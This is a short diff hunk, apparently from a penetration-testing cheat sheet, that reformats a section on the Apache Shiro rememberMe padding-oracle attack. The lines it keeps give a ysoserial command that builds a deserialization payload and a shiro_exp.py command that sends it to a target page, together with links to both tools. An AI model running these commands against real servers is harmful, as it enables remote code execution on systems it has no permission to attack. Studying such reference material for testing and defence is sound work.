@@ -638,17 +638,13 @@ Authorization: Bearer <token>
 
 ## Padding Oracle Attack
   
-### Identify
-
--> rememberMe: (Cookie)
-
-### Exploiting 
-
+e.g.  
+-> rememberMe: (Cookie)  
+-> Exploiting  
 `java -jar ysoserial.jar CommonsBeanutils1 "touch /tmp/success" > payload.class`  
-https://github.com/frohoff/ysoserial
-
+https://github.com/frohoff/ysoserial  
 `python shiro_exp.py site.com/home.jsp cookie payload.class`  
-https://github.com/wuppp/shiro_rce_exp/blob/master/shiro_exp.py
+https://github.com/wuppp/shiro_rce_exp/blob/master/shiro_exp.py  
   
 ## Hash Length Extension Attack
 
